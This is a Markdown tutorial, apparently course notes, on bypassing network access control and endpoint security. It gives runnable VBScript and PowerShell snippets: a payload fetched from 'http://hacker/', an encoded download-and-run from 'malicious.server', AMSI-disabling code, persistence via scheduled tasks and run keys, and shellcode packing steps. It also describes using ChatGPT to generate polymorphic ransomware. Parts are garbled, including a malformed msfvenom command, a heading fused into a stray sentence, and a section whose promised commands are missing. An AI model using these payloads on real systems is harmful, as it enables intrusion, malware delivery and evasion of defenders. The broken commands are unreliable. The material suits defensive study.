# 🖥️ Evading NAC and Endpoint Security
This section discusses various techniques used by attackers to bypass network access control (NAC) and endpoint security.

---
## NAC and Endpoint Security Evasion Techniques 
**NAC and Endpoint Security Evasion** involves techniques used by attackers to bypass security controls that protect networks and devices.

**NAC (Network Access Control)** blocks unknown or unauthorized devices, but attackers can bypass it using tricks like **VLAN hopping** or connecting through a **pre-authenticated device**.

**Endpoint security** protects user devices from threats, but attackers use advanced evasion methods to slip past **EDR tools**, infect devices with malware, and silently maintain control without being detected.

---
## Bypassing NAC using VLAN Hopping 
**VLAN Hopping** is a technique attackers use to bypass Network Access Control (NAC) by tricking a switch into creating a trunk link using **DTP** (Dynamic Trunking Protocol). By setting the switch mode to **dynamic auto** or **dynamic desirable**, the attacker establishes a trunk connection, allowing access to multiple VLANs and unauthorized parts of the network.

### VLAN Hopping Tools 

#### VLANPWN 
🔗Source: [https://github.com/pirenga/VLANPWN]

**VLANPWN** is a simple tool with two Python scripts used for **VLAN enumeration and VLAN hopping attacks**. It helps attackers bypass network segmentation and access restricted VLAN traffic.

* **DoubleTagging.py** sends specially crafted packets with two VLAN  802.1Q tags to trick switches and reach target VLANs.

  Example:

  `python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim <IP> --attacker <IP>`

* **DTPHijacking.py** spoofs switch behavior using DTP frames, turning the attacker's device into a trunk port to access all VLANs.

  Example:

  `python3 DTPHijacking.py --interface eth0`

These scripts demonstrate how VLAN security can be bypassed using basic techniques.

## Bypassing NAC using Pre-authenticated Device 
Attackers can gain access to an authenticated device and use that device to bypass NAC. Attackers place their device (e.g., Raspberry Pi) between the pre-authenticated device and the authentication server to ensure that the traffic flows through their device.

### Tools to Bypass NAC using a Pre-authenticated Device

🔗Source: [https://github.com/scipag/nac_bypass/blob/master/nac_bypass_setup.sh]

The attacker places their system—like a **Raspberry Pi with two network adapters**—between the network switch and the trusted device. This setup lets the attacker secretly send their own network traffic while appearing as the trusted device, avoiding NAC restrictions.

## Bypassing Endpoint Security using Ghostwriting 
**Ghostwriting** is a technique used to bypass endpoint security like antivirus software by changing how malware code looks without changing how it works. Attackers break down the code (usually in assembly) and add extra harmless code to hide the real malicious parts. This helps the malware avoid detection by signature-based tools. Tools like **Ghostwriting.sh** are used to perform this trick.

#### Ghostwriting.sh 
🔗Source: [https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Attack/Ghostwriting.md]

Ghostwriting is used to bypass antivirus software by utilizing binary deconstruction, insertion of arbitrary assembly code, and reconstruction. It uses the built-in Metasploit tools to perform these actions. Ghostwriting.sh is a tool to automate this process.

An example scenario is given below:
```bash

# Step 2: Run the script with root privileges
sudo ./ghostwriting.sh

# --- Script Actions ---
# 1. Downloads and installs required tools automatically.
# 2. Generates a Meterpreter reverse TCP payload that connects back to this machine's private IP.
# 3. Disassembles the payload and adds junk (useless) code to avoid antivirus detection.
# 4. Reassembles the binary with junk code still functioning as a backdoor.
# 5. Starts a Python-based HTTP server to host the malicious payload for the victim to download.

# ****************************************************

```

## Bypassing Endpoint Security using Application Whitelisting
**Bypassing Endpoint Security using Application Whitelisting** involves tricking the system into running malicious code through trusted applications. Windows uses **application whitelisting** to allow only approved programs to run. However, attackers use **DLL hijacking** by placing a fake DLL (with the same name as the one the app expects) in the same folder as a trusted executable. When the app runs, it loads the malicious DLL, helping attackers bypass security, gain persistence, and escalate privileges.

They can also use tools like **regsvr32.exe**, **rundll32.exe**, or **PowerShell** to load the malicious DLL

Example command:

`regsvr32.exe /s /n /u /i:"C:\path_to_malicious.dll"`

This helps avoid detection by endpoint security tools.

## Bypassing Endpoint Security by Dechaining Macros 
**Dechaining Macros** is a technique attackers use to bypass endpoint security by hiding malicious code inside Microsoft Office macros. These macros use **VBScript** to silently modify memory, the registry, or system files. By splitting and disguising the code (dechaining), attackers can avoid being detected by both static and dynamic security analysis tools, making it harder to spot the threat.

Techniques used to bypass endpoint security by dechaining macros are as follows: 

### Spawning through ShellCOM 
**Spawning through ShellCOM** is a technique where attackers use **COM objects** in scripts like **VBScript** to start new processes. They reference specific COM components, such as **ShellBrowserWindow**, to run programs without using common methods that security tools may detect.

**For example:**
```vb
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "calc.exe", Null, "C:\\Windows\\System32", Null, 0
```
This code silently runs **calc.exe** using a COM object, helping attackers evade detection.

### Spawning using XMLDOM 
**Spawning using XMLDOM** is a technique where attackers use a script to run malicious code through an Office process. They create an XML object and load a harmful file (like an `.xsl` payload) from a remote server. This file is then executed within the Office application, allowing the attacker to run malicious code silently.

**Example:**
```vb
Set xml = CreateObject("Microsoft.XMLDOM")
xml.async = False
Set xsl = xml
xsl.load("file://|http://hacker/malicous_payload.xsl")
xml.transformNode xsl
```

### Spawning through WmiPrvse.exe 
**Spawning through WmiPrvse.exe** is a technique where attackers use **Windows Management Instrumentation (WMI)** to run programs remotely without using or relying on applications like Microsoft Office. They do this by using the **wmiprvse.exe** process, which is a trusted system service.

For example, the following script quietly runs **calc.exe** (Calculator) using WMI:
```vbscript
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
errReturn = objProcess.Create("calc.exe", Null, objConfig, intProcessID)
```
This method helps attackers run hidden commands on a system, making it harder to detect malicious activity.

### Creating Scheduled Tasks 
**Creating Scheduled Tasks** is a technique attackers use to run malicious programs at specific times without being noticed. They often use **VBScript** to create these tasks and make them appear as if they're from trusted sources like Microsoft Office or security software. This helps hide the attack and delay its execution.

In the given example, the script schedules the **Calculator app (calc.exe)** to run 30 seconds after the script is executed, under the fake author name **"McAfee Corporation"**. It also hides the real source by spawning the task through the system’s service host process.

**Example Script:**
```vbscript
Set service = CreateObject("Schedule.Service") 
Call service.Connect
Dim td: Set td = service.NewTask(0) 
td.RegistrationInfo.Author = "McAfee Corporation"
td.settings.StartWhenAvailable = True 
td.settings.Hidden = False
Dim triggers: Set triggers = td.triggers 
Dim trigger: Set trigger = triggers.Create(1) 
Dim startTime: ts = DateAdd("s", 30, Now) 
startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2) 
trigger.StartBoundary = startTime 
trigger.ID = "TimeTriggerId"
Dim Action: Set Action = td.Actions.Create(0) 
Action.Path = "C:\Windows\System32\calc.exe" 
'Action.Arguments = "/c whoami" 
Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
```
This method is commonly used to maintain persistence or delay detection of malicious activity.

### Registry Modification 
**Registry Modification** is a technique attackers use to change system settings, store malicious payloads, or make malware run automatically when the system starts. They can do this using **VBScript**, even from within a macro. By creating or editing registry keys, attackers can ensure their malware keeps running without needing the macro again.

Here’s an example of a script that adds a program to run at startup:
```vbscript
Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
objRegistry.SetStringValue &H80000001, "Software\Microsoft\Windows\CurrentVersion\Run", "key1", "value1"
```
This code adds a new **run key** to make "value1" execute at system startup under the name "key1".

### Dropping Files
**Dropping Files** is a technique where attackers use **VBScript** and **FileSystemObject** to place malicious files on a system, often in the **Startup** folder so they run automatically when the system boots. This helps bypass detection by separating the payload from initial macros.

Here’s an example that creates a batch file in the Startup folder to launch **Notepad** (can be replaced with a malicious command):
```vbscript
Path = CreateObject("WScript.Shell").SpecialFolders("Startup") 
Set objFSO = CreateObject("Scripting.FileSystemObject") 
Set objFile = objFSO.CreateTextFile(Path & "\sample.bat", True) 
objFile.Write "notepad.exe" & vbCrLf 
objFile.Close
```
Attackers can replace `notepad.exe` with any payload to ensure it runs at startup silently.

### Downloading Content 
**Downloading Content** is a technique where attackers use **VBScript** to silently download malicious files to a victim’s system. They use the **XMLHTTP** library to fetch the file from a remote server and **ADODB.Stream** to save it to the disk, memory, or registry. This method allows the attacker to place malware without alerting the user.

**Example:**
```vbscript
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP") 
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream") 
xHttp.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe", False
xHttp.Send 
With bStrm
      .Type = 1 
      .Open
      .write xHttp.responseBody 
      .savetofile Environ("APPDATA") & "\sample.exe", 2
End With 
```
This script downloads **putty.exe** and saves it as **sample.exe** in the AppData folder, which can then be executed silently.

### Embed File and Drop
**Embed File and Drop** is a technique where attackers hide a malicious file inside a macro using tools like Metasploit’s **vba-exe**. When the macro runs, it drops and executes the hidden file on the victim’s system. For example, an attacker can embed a calculator app as a payload using this command:
```bash
msfvenom -p "GET", generic/custom PAYLOADFILE=/home/user1/Downloads/calc.exe -a x64 --platform windows -f vba-exe
```
This creates a macro that silently drops and runs **calc.exe** when the document is opened, demonstrating how easily attackers can use this method to deliver malware.

**Bypassing Endpoint Security by Clearing Memory Hooks** is a technique attackers use to avoid detection by EDR (Endpoint Detection and Response) tools. ## Bypassing Endpoint Security by Process Injection 
**Process Injection** is a technique where attackers hide malware by injecting it into the memory of legitimate running processes. This helps the malware avoid detection because most security tools don’t deeply check the internal behavior of every process. Attackers use this method to stay hidden, gain more control, or keep access to the system. It’s often done using Windows functions like **VirtualAllocEx()**, **WriteProcessMemory()**, and **CreateRemoteThread()**.

* **VirtualAllocEx()** - 
  Allocates memory in another process. Attackers use it to reserve space for malicious code.

* **WriteProcessMemory()** - 
  Writes data (like malicious payload) into the target process’s memory.

* **CreateRemoteThread()** - 
  Starts a new thread in the target process to **run the injected malicious code**.

## Bypassing Endpoint Security by CPL (Control Panel) Side-Loading 
**CPL Sideloading** is a technique attackers use to bypass endpoint security by hiding malware inside **.cpl files**, which are normally used for Windows Control Panel tools. Since these files are seen as safe, the malicious code inside them can run without raising alarms. The malware mimics real Control Panel functions, making it hard for both users and security tools to detect the threat.

<img width="563" height="462" alt="image" src="https://github.com/user-attachments/assets/747a6cbc-af72-4fbc-bb33-0ea832881ed3" />

**Malicious CPL files** are used by attackers to hide harmful code inside Windows Control Panel files. When a user runs a legitimate-looking `.cpl` file, the hidden malware gets loaded—either by triggering a specific function or by taking advantage of how Windows handles CPL files.

Instead of running the file directly, attackers often trick a trusted app to load it during startup or system processes. Since `.cpl` files aren’t usually seen as threats, security tools might miss them. Attackers may also rename malicious DLLs with a `.cpl` extension and place them in the registry so they run when the Control Panel opens, helping them stay hidden and maintain access.

<img width="412" height="251" alt="image" src="https://github.com/user-attachments/assets/acff3a77-e639-473f-b937-60715afc8cc5" />

However, attackers can also use tools such as **CPLResourceRunner** to create malicious CPL files using the following steps: 

🔗Source: [https://github.com/rvrsh3ll/CPLResourceRunner]

1. **Generate Payload** - 
   Use Cobalt Strike to create a staged payload (`beacon.bin`) in x86 format.

2. **Convert to Shellcode** - 
   Run `ConvertShellcode.py` to turn `beacon.bin` into `shellcode.txt`.

3. **Base64 Encode** - 
   Clean, compress, and encode `shellcode.txt` into Base64 using:

   ```bash
   cat shellcode.txt | sed ‘s/[, ]//g; s/0x//g;’ | tr -d ‘\n’ | xxd -p -r | gzip -c | base64 > b64shellcode.txt
   ```

4. **Insert into Resource File** - 
   Paste the Base64-encoded shellcode into `Resources.txt`.

5. **Build Malicious CPL** - 
   Combine the resources and `CPLResourceRunner.dll` to create `maliciousnew.cpl`.

Thus, CPL sideloading can be used as a sophisticated evasion technique, where attackers leverage trusted system components to conceal malicious activities and evade traditional detection mechanisms.

**Bypassing Endpoint Security using ChatGPT** involves attackers using AI tools like ChatGPT to create **polymorphic malware**—malware that constantly changes its code. This makes it hard for traditional security systems to detect. Attackers can use ChatGPT to generate different versions of malicious code and even tweak how APIs are used, helping the malware slip past endpoint protection tools and making defense much harder. Similarly, attackers could use ChatGPT to create injectors that mutate when required. If an attacker asks for code, the attacker can provide a unique code each time. This helps them create a program that is good at hiding and challenging for endpoint security systems to detect. In addition, attackers can adopt sophisticated approaches, as discussed below: 

### Obtaining the code 
In this phase, attackers can use ChatGPT to acquire a function code that locates various files that the ransomware may target for encryption. They can then ask ChatGPT to generate a file-encryption utility code that allows them to encrypt these files, as shown in the following screenshots:

ChatGPT helps the malware by generating or modifying malicious code on demand—like injecting code or encrypting files—without needing fixed patterns. This makes the malware **polymorphic**, meaning it keeps changing and looks harmless to security tools. ### Validation
This phase includes validation of the generated code to ensure its functionality. Attackers can use the following methods to achieve the proper functionality of the obtained code:
1. The C2 server directs malware to encrypt a file using a specific key. Subsequently, attackers ask ChatGPT to provide a function for encrypting the files.
2. The malware obtains the function code as text.
3. A test file is created by malware that includes known content and then performs encryption with the same key.
4. The encrypted test file is sent back to the C2 server by the malware, which then attempts to decrypt the file.
5. Once the code is validated by the C2 server, it instructs the malware to encrypt the required files; otherwise, it continues trying until it obtains a working encryption function.

### Execution
**Execution** is the phase where attackers run malicious code using built-in Python functions like `compile()`, `exec()`, and `eval()`. If the malware has a Python interpreter inside, it can execute this code across different platforms. After running, the malware may delete the code to avoid detection by security tools.

## Bypassing Windows Antimalware Scan Interface (AMSI) 
AMSI (Antimalware Scan Interface) is a Windows API that enhances malware protection in Windows applications. It can be integrated with compatible antimalware software in the system to enhance detection capabilities, including signature-and reputation-based detection.

Attackers can bypass Windows AMSI by manipulating elements such as URLs, functions, or internal files.

Techniques used to bypass AMSI are discussed below: 

### PowerShell Downgrade 
Attackers can downgrade the PowerShell version to 2.0 to evade AMSI detections. This allows them to execute malicious commands such as `amsiutils`, which are generally blocked by AMSI. Run the following command to downgrade PowerShell version: `powershell -version 2`

<img width="610" height="184" alt="image" src="https://github.com/user-attachments/assets/aaf859f7-87c1-4eeb-84ee-9b57a3c97d31" />

### Obfuscation
Obfuscation involves making code complex and unreadable to bypass AMSI detection. This technique allows attackers to break strings and concatenate them using the + operator. Attackers can also use tools such as `AmsiTrigger` to scan scripts against AMSI and identify triggering lines for targeted obfuscation. For instance, run the following command to obfuscate the invoke-mimikatz command: 
```powershell
Invoke-Mimikatz
"Inv”+"o”+"ke"+"-Mimi"+"katz"
```

<img width="641" height="139" alt="image" src="https://github.com/user-attachments/assets/69e5adec-ff74-4145-a692-f6373c153819" />

### Forcing an error
In this technique, when an AMSI scan is initiated, the amsiInitFailed() function returns 0, which indicates successful initialization. Attackers can modify this by setting the function to a “Boolean True” value, which results in generating an error during AMSI initialization.

This allows them to bypass the AMSI through memory allocation and modify the values within the AmsiUtils class.

Run the following commands to bypass AMSI detection by forcing an error: 
```powershell
# Allocate memory to spoof AMSI context
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

# Nullify the AMSI session and context to disable AMSI scanning
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession", "NonPublic,Static").SetValue($null, $null)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$mem)
```
<img width="732" height="124" alt="image" src="https://github.com/user-attachments/assets/bfd2fe30-95ef-4f64-a81d-b9fbd8da2eb6" />

### Memory Hijacking
Attackers can manipulate the internal functions of AMSI using memory-hijacking techniques. This involves hooking the AmsiScanBuffer() function and forcing it to always return AMSI_RESULT_CLEAN, which indicates that AMSI has found no signs of malware.

Run the following commands to bypass AMSI detection by downloading and loading the ASBBypass.dll file:

## Other Techniques for Bypassing Endpoint Security 
**Bypassing Endpoint Security** involves attackers using advanced tricks to stay hidden on a compromised system. Even if security tools like **sandboxing**, **UBA**, **SIEM**, **IDS**, **IPS**, or **EDRs** are in place, attackers can avoid detection by using smart malware and stealth techniques. This helps them maintain control, avoid behavior-based alerts, and continue malicious activities without being noticed.

### Hosting Phishing Sites on Popular Infrastructure 
**Hosting Phishing Sites on Popular Infrastructure** is a tactic where attackers use trusted services like **Google Cloud** or **AWS** to host phishing websites. Since these platforms are not usually blacklisted, they can bypass **EDR (Endpoint Detection and Response)** systems that block known malicious IPs. Attackers also use **social media platforms** to spread malware by hiding harmful code in images or videos using **steganography**. The hidden code is read by already infected systems, helping attackers avoid detection and carry out further attacks.

### Passing Encoded Commands
**Passing Encoded Commands** is a technique where attackers hide their commands using formats like **Base64** or **hex** to avoid detection. By encoding the commands, they make it harder for security tools to recognize malicious activity. For example, they might encode a script in Base64 or use hex to ping IP addresses without raising alerts.

**For example,**
```powershell
# 1. Define the malicious download‑and‑run command
$command = "Invoke-WebRequest -Uri http://malicious.server/payload.exe -OutFile C:\Users\Public\payload.exe; Start-Process C:\Users\Public\payload.exe"

# 2. Convert the command to a byte array (Unicode)
$bytes    = [System.Text.Encoding]::Unicode.GetBytes($command)

# 3. Base64‑encode those bytes
$encoded  = [Convert]::ToBase64String($bytes)

# 4. Show the encoded payload (what you’ll actually send)
echo $encoded

# 5. (Attacker side) Run the hidden command via PowerShell’s -EncodedCommand switch
powershell.exe -EncodedCommand $encoded
```
Now, the attacker passes this Base64 encoded command to cover the code and bypass endpoint security.

### Fast Flux DNS Method
**Fast Flux DNS** is a technique used by attackers to hide their real servers by quickly changing IP addresses and domain names. It's often used by **botnets** to avoid detection and bypass blacklists. Instead of connecting directly to the attacker’s command-and-control (C\&C) server, the victim connects to **compromised systems** acting as temporary middlemen (reverse proxies). This makes it harder for security tools to trace or block the actual malicious server.

### Timing-based Evasion
This is a sandbox evasion technique where malware is executed during a specific time or after certain actions by the victim. The actions may include opening a particular window and clicking it, which activates it after the system reboots. Some other examples are sleep patching, delay APIs, and time bombs.

### Signed Binary Proxy Execution
**Signed Binary Proxy Execution** is a technique where attackers use trusted, built-in Windows tools (like **rundll32**) to run malicious code. Since these tools are digitally signed and seen as safe by security systems, the malicious activity hides behind them and can bypass **EDR** detection. This helps attackers execute harmful commands without raising alarms.

### Shellcode Encryption
**Shellcode Encryption** is a technique attackers use to hide malicious code from security tools like EDR. They encrypt the shellcode using methods like **XOR**, **RC4**, or **AES**, and store or generate the decryption key within the malware. When the malware runs, it decrypts the code in memory and executes it, making it harder for security tools to detect because the original shellcode is never visible in plain form.

### Reducing Entropy
**Reducing Entropy** is a technique where attackers make malicious files look less suspicious by lowering their randomness (entropy). They do this by adding simple data like images or common system strings (e.g., *chrome.dll*) to the file. This helps the malware avoid detection by security tools that look for high-entropy (highly random or encrypted) content.

### Escaping the (Local) AV Sandbox 
**Escaping the Local AV Sandbox** is a technique where attackers delay malicious code execution to avoid detection. Since EDR tools only observe program behavior for a few seconds in a local sandbox, attackers use time-consuming tasks—like calculating large prime numbers—to stall. This tricks the system into thinking the program is safe, allowing the real attack to run after the sandbox analysis ends.

### Disabling Event Tracing for Windows (ETW)
**Disabling Event Tracing for Windows (ETW)** is a technique used by attackers to avoid detection by security tools like Microsoft Defender. **ETW** is a tracking system built into Windows that monitors how programs and system calls behave. It uses both **kernel** and **user-level components**, especially a file called **ntdll.dll**.

Attackers can hijack this DLL to disable ETW by modifying a key function called **EtwEventWrite**. By changing its instructions to return a success signal without actually logging anything, attackers can silently bypass security monitoring and run malicious code undetected.

### Direct System Calls and Evading “Mark of the Syscall” 
**Direct System Calls** are used by attackers to bypass security tools that monitor standard Windows API calls. Instead of calling functions like **VirtualAlloc**, they directly call low-level kernel functions like **NtAllocateVirtualMemory** from **ntdll.dll**. To avoid detection, attackers grab the system call ID, prepare the required arguments, and use the **syscall** instruction to execute it—completely bypassing security hooks and making it harder for security tools to detect malicious activity.

### Spoofing the Thread Call Stack
**Spoofing the Thread Call Stack** is a technique used by attackers to hide malware (like beacons or implants) from detection. While the implant is idle and waiting for commands, its location in memory can be exposed by EDR tools checking the thread's return address, which usually points to the malicious shellcode.

To avoid this, attackers intercept the **Sleep()** function and temporarily erase the return address (set it to **0x0**) before calling Sleep. When the Sleep period ends, they restore the original return address so the implant continues working normally—making it harder for security tools to trace or detect the shellcode during scans.

### In-memory Encryption of Beacon
**In-memory Encryption of Beacon** is a stealthy technique where attackers hide their malicious code in memory to avoid detection. When the code (called a **beacon**) is inactive, it’s encrypted using a method like **XOR** to make it unreadable. This happens during sleep functions like **Sleep()**, which pauses the malware. Before resuming, the code is decrypted and runs again. By hiding the code while it's idle and only revealing it when needed, attackers can bypass many security tools that scan memory for threats.
